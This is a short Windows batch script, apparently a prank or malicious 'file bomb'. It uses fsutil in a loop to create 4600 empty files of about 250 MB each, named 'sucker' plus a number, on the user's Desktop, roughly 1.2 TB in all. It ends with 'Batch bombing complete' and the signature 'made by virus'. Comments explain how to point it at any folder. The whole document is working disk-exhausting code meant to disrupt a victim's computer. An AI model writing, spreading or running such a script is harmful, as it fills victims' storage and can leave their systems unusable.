
@echo off
setlocal enabledelayedexpansion


set num_files=4600

set file_size=262144000

rem Loop to create the files
for /l %%i in (1, 1, %num_files%) do (
    rem Create the file with a unique name
    fsutil file createnew "%userprofile%\Desktop\sucker%%i.txt" %file_size%
)
   rem change \desktop\ to any folder thats you want to creats the files 
echo Batch bombing complete.

  rem made by virus
